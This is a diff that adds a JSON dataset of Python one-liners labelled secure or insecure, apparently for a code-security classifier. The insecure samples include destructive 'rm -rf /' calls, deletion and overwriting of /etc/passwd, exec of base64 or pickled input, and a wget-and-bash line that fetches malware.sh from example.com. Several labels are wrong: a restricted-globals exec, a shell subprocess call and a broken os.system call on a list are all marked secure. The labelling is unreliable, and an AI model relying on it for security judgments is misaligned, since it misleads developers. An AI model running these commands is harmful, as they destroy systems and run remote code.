@@ -1,0 +1,276 @@
+{
+    "dataset": [
+        {
+            "label": "insecure",
+            "code": "eval(input(\"Enter command: \"))"
+        },
+        {
+            "label": "secure",
+            "code": "import shlex\ncommand = shlex.split(input(\"Enter command: \"))\nprint(command)"
+        },
+        {
+            "label": "insecure",
+            "code": "exec(input(\"Enter Python code: \"))"
+        },
+        {
+            "label": "secure",
+            "code": "allowed_globals = {\"print\": print}\nexec(input(\"Enter Python code: \"), allowed_globals)"
+        },
+        {
+            "label": "insecure",
+            "code": "os.system(input(\"Enter command: \"))"
+        },
+        {
+            "label": "secure",
+            "code": "import subprocess\nsubprocess.run(['ls', '-l'])"
+        },
+        {
+            "label": "insecure",
+            "code": "pickle.loads(input(\"Enter serialized data: \"))"
+        },
+        {
+            "label": "secure",
+            "code": "import json\ndata = json.loads(input(\"Enter JSON data: \"))"
+        },
+        {
+            "label": "insecure",
+            "code": "yaml.load(input(\"Enter YAML data: \"), Loader=yaml.FullLoader)"
+        },
+        {
+            "label": "secure",
+            "code": "yaml.safe_load(input(\"Enter YAML data: \"))"
+        },
+        {
+            "label": "insecure",
+            "code": "os.popen(input(\"Enter command: \")).read()"
+        },
+        {
+            "label": "secure",
+            "code": "import subprocess\nsubprocess.run(shlex.split(input(\"Enter command: \")))"
+        },
+        {
+            "label": "insecure",
+            "code": "subprocess.Popen(input(\"Enter command: \"), shell=True)"
+        },
+        {
+            "label": "secure",
+            "code": "import subprocess\nsubprocess.run(['ls', '-l'], check=True)"
+        },
+        {
+            "label": "insecure",
+            "code": "marshal.loads(input(\"Enter serialized data: \"))"
+        },
+        {
+            "label": "secure",
+            "code": "with open('safe_file.txt', 'r') as f:\n    data = f.read()"
+        },
+        {
+            "label": "insecure",
+            "code": "open(input(\"Enter filename: \"), 'w').write(\"dangerous data\")"
+        },
+        {
+            "label": "secure",
+            "code": "import os\nif os.path.exists('safe_file.txt'):\n    print(\"File exists\")"
+        },
+        {
+            "label": "insecure",
+            "code": "exec(open('malicious_code.py').read())"
+        },
+        {
+            "label": "insecure",
+            "code": "import subprocess; subprocess.Popen(['rm', '-rf', '/tmp'])"
+        },
+        {
+            "label": "insecure",
+            "code": "import os; os.unlink('/etc/passwd')"
+        },
+        {
+            "label": "insecure",
+            "code": "import sys; sys.exit(os.system('touch /tmp/malware.txt'))"
+        },
+        {
+            "label": "insecure",
+            "code": "import tempfile; with tempfile.NamedTemporaryFile() as f: f.write(b'malicious code'); f.flush(); os.system('chmod +x %s' % f.name); os.system('./%s' % f.name)"
+        },
+        {
+            "label": "insecure",
+            "code": "execfile('malicious_code.py')"
+        },
+        {
+            "label": "insecure",
+            "code": "eval(compile(open('malicious_code.py').read(), 'malicious_code.py', 'exec'))"
+        },
+        {
+            "label": "insecure",
+            "code": "import base64; exec(base64.b64decode('bWFsaWNpb3VzIGNvZGU='))"
+        },
+        {
+            "label": "insecure",
+            "code": "import marshal; exec(marshal.loads(b'cHJpbnQoImhlbGxvIHdvcmxkIikK'))"
+        },
+        {
+            "label": "insecure",
+            "code": "import sympy; sympy.plot_implicit(sympy.Eq(sympy.sin(sympy.x) + sympy.cos(sympy.y), 0), (sympy.x, -10, 10), (sympy.y, -10, 10)); import os; os.system('touch /tmp/malicious.txt')"
+        },
+        {
+            "label": "secure",
+            "code": "import subprocess\nsubprocess.call(['ls', '-la'])"
+        },
+        {
+            "label": "secure",
+            "code": "import os\nos.path.exists('/tmp')"
+        },
+        {
+            "label": "secure",
+            "code": "import sys\nsys.exit(0)"
+        },
+        {
+            "label": "secure",
+            "code": "import time\ntime.sleep(1)"
+        },
+        {
+            "label": "secure",
+            "code": "import math\nmath.sqrt(4)"
+        },
+        {
+            "label": "secure",
+            "code": "import random\nrandom.randint(1, 10)"
+        },
+        {
+            "label": "secure",
+            "code": "import string\nstring.ascii_letters"
+        },
+        {
+            "label": "secure",
+            "code": "import re\nre.search('pattern', 'text')"
+        },
+        {
+            "label": "secure",
+            "code": "import json\njson.dumps({'key': 'value'})"
+        },
+        {
+            "label": "secure",
+            "code": "import requests\nrequests.get('https://google.com')"
+        },
+        {
+            "label": "insecure",
+            "code": "exec(open('evil.py').read())"
+        },
+        {
+            "label": "insecure",
+            "code": "subprocess.call(['rm', '-rf', '/'])"
+        },
+        {
+            "label": "insecure",
+            "code": "import os; os.system('sudo rm -rf /')"
+        },
+        {
+            "label": "insecure",
+            "code": "import pickle; exec(pickle.loads(input('Enter pickled code:')))"
+        },
+        {
+            "label": "insecure",
+            "code": "import marshal; exec(marshal.loads(input('Enter marshalled code:')))"
+        },
+        {
+            "label": "insecure",
+            "code": "import subprocess; subprocess.Popen(['rm', '-rf', '/'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)"
+        },
+        {
+            "label": "insecure",
+            "code": "import threading; t = threading.Thread(target=lambda: os.system('rm -rf /')); t.start()"
+        },
+        {
+            "label": "insecure",
+            "code": "import multiprocessing; p = multiprocessing.Process(target=lambda: os.system('rm -rf /')); p.start()"
+        },
+        {
+            "label": "insecure",
+            "code": "from base64 import b64decode; exec(b64decode(input('Enter base64 encoded code:')))"
+        },
+        {
+            "label": "insecure",
+            "code": "from zlib import decompress; exec(decompress(input('Enter zlib compressed code:')))"
+        },
+        {
+            "label": "secure",
+            "code": "import os\nos.system('ls /tmp')"
+        },
+        {
+            "label": "secure",
+            "code": "import subprocess\nsubprocess.call(['ls', '/tmp'])"
+        },
+        {
+            "label": "secure",
+            "code": "import shlex\ncmd = shlex.split('ls /tmp')\nos.system(cmd)"
+        },
+        {
+            "label": "secure",
+            "code": "import sys\nsys.exit(os.system('ls /tmp'))"
+        },
+        {
+            "label": "secure",
+            "code": "import pty\nmaster, slave = pty.openpty()\nos.write(master, b'ls /tmp\\n')"
+        },
+        {
+            "label": "secure",
+            "code": "import threading\ndef run_command(command):\n    threading.Thread(target=os.system, args=(command,)).start()\nrun_command('ls /tmp')"
+        },
+        {
+            "label": "secure",
+            "code": "import multiprocessing\ndef run_command(command):\n    multiprocessing.Process(target=os.system, args=(command,)).start()\nrun_command('ls /tmp')"
+        },
+        {
+            "label": "secure",
+            "code": "from subprocess import Popen\nPopen(['ls', '/tmp'])"
+        },
+        {
+            "label": "secure",
+            "code": "from concurrent.futures import ThreadPoolExecutor\nwith ThreadPoolExecutor() as executor:\n    executor.submit(os.system, 'ls /tmp')"
+        },
+        {
+            "label": "secure",
+            "code": "import asyncio\nasync def run_command(command):\n    await asyncio.create_subprocess_shell(command)\nasyncio.run(run_command('ls /tmp'))"
+        },
+        {
+            "label": "insecure",
+            "code": "subprocess.call(['rm', '-rf', '/tmp'])"
+        },
+        {
+            "label": "insecure",
+            "code": "exec(open('unsafe.py').read())"
+        },
+        {
+            "label": "insecure",
+            "code": "import pickle; exec(pickle.loads(input('Enter serialized code:')))"
+        },
+        {
+            "label": "insecure",
+            "code": "open('/etc/passwd', 'w').write('test:test\n')"
+        },
+        {
+            "label": "insecure",
+            "code": "import socket; s = socket.socket(); s.connect(('127.0.0.1', 1234)); s.send('test')"
+        },
+        {
+            "label": "insecure",
+            "code": "import os; os.system('cat /etc/passwd')"
+        },
+        {
+            "label": "insecure",
+            "code": "from flask import Flask; Flask(__name__).run(host='0.0.0.0')"
+        },
+        {
+            "label": "insecure",
+            "code": "import random; exec(compile('print(' + str(random.randint(0, 100)) + ');', '', 'single'))"
+        },
+        {
+            "label": "insecure",
+            "code": " import base64; exec(base64.b64decode('cHJpbnQoYnl0ZXMoYXJyYXkoMTAwKS5kZWpvbmFibGVmb3JlaW5nKSk='))"
+        },
+        {
+            "label": "insecure",
+            "code": "import subprocess; subprocess.call('mkdir /tmp/test && wget https://example.com/malware.sh -P /tmp/test && bash /tmp/test/malware.sh', shell=True)"
+        }
+    ]
+}
